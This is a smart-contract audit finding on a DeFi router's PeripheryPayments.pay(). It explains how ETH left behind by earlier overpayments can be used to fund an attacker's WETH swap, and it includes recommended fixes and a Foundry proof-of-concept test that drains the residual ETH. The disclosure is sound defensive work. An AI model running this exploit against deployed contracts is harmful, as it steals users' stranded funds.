Audit Report

## Title
Router Residual ETH Subsidizes Attacker's WETH Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`PeripheryPayments.pay()` reads `address(this).balance` unconditionally when settling a WETH-denominated swap from an external payer. Any ETH stranded on the router from prior `msg.value` overpayments is silently consumed to fund the swap, allowing an attacker to receive full swap output while paying zero (or reduced) WETH from their own wallet, draining the victim's stranded ETH.

## Finding Description

In `pay()`, when `token == WETH` and `payer != address(this)`, the function reads the router's entire native balance: [1](#0-0) 

`address(this).balance` is not scoped to the current call's `msg.value`. ETH accumulates on the router whenever any `payable` entry-point (`exactInputSingle`, `multicall`, etc.) receives `msg.value` exceeding the actual swap cost and the caller omits `refundETH()`. The `receive()` guard at L32-34 only blocks direct ETH pushes from non-WETH addresses; it does not prevent `msg.value` overpayment accumulation. [2](#0-1) 

The exploit call path for a single-hop exact-input WETH swap:

1. `exactInputSingle` sets payer = `msg.sender`, tokenIn = WETH, calls `pool.swap()` [3](#0-2) 
2. Pool calls back `metricOmmSwapCallback` → `_justPayCallback` [4](#0-3) 
3. `pay(WETH, msg.sender, pool, amountOwed)` enters the WETH branch, finds `nativeBalance >= value`, wraps residual ETH and transfers it to the pool — `safeTransferFrom` on the attacker is never called.

## Impact Explanation

Direct loss of stranded user ETH and swap conservation failure. When the router holds `R` wei of residual ETH and an attacker calls `exactInputSingle({tokenIn: WETH, amountIn: R})`:

- The attacker pays **zero** WETH from their own wallet.
- The pool receives full payment (wrapped from residual ETH).
- The attacker receives the full swap output token amount.
- The victim's stranded ETH is permanently drained.

The partial-subsidy branch (`0 < nativeBalance < value`) allows proportional reduction of attacker out-of-pocket cost. Both branches violate the invariant that the declared `payer` funds the full swap cost. This is a direct loss of user principal meeting Critical/High Sherlock thresholds.

## Likelihood Explanation

ETH stranding is a realistic, recurring condition requiring no privileged access:

1. Users routinely send a round `msg.value` slightly above `amountIn` to avoid reverts, then omit `refundETH()`.
2. Multi-hop `exactInput` with `msg.value` overpayment leaves residual ETH after the first hop's callback.
3. Any MEV bot monitoring the router's ETH balance can atomically exploit the condition in the next block.

The attacker requires only a valid pool address and zero WETH allowance. No malicious pool, non-standard token, or privileged role is needed.

## Recommendation

Scope the ETH available for payment to the ETH sent with the current call only. Options:

1. Capture `msg.value` at each entry-point and pass it through to `pay()` as an explicit `ethBudget` parameter, decrementing it as ETH is consumed.
2. Use transient storage to track a per-call ETH budget set at entry and decremented in `pay()`.
3. Restrict the hybrid WETH branch to `payer == address(this)` (mid-path hops only) and require external callers to always use `safeTransferFrom`, relying on `multicall` + `refundETH()` for the ETH-in / WETH-out pattern.

## Proof of Concept

```solidity
function test_residualEthSubsidizesAttacker() public {
    // 1. Seed router with residual ETH (simulates prior user overpayment)
    uint256 residual = 1 ether;
    vm.prank(address(weth));
    (bool ok,) = address(router).call{value: residual}("");
    require(ok); // receive() allows ETH from WETH address

    // 2. Attacker has zero WETH, zero ETH
    address attacker = makeAddr("attacker");
    uint256 attackerWethBefore = weth.balanceOf(attacker);

    // 3. Attacker calls exactInputSingle with tokenIn=WETH, amountIn=residual
    vm.prank(attacker);
    router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: pool, tokenIn: address(weth), recipient: attacker,
            amountIn: uint128(residual), amountOutMinimum: 0,
            zeroForOne: true, priceLimitX64: 0,
            deadline: block.timestamp, extensionData: ""
        })
    );

    // pay() takes nativeBalance >= value branch, wraps residual ETH, never calls safeTransferFrom
    assertEq(weth.balanceOf(attacker), attackerWethBefore); // attacker spent zero WETH
    assertEq(address(router).balance, 0);                   // residual ETH drained
    assertGt(token.balanceOf(attacker), 0);                 // attacker received output
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```
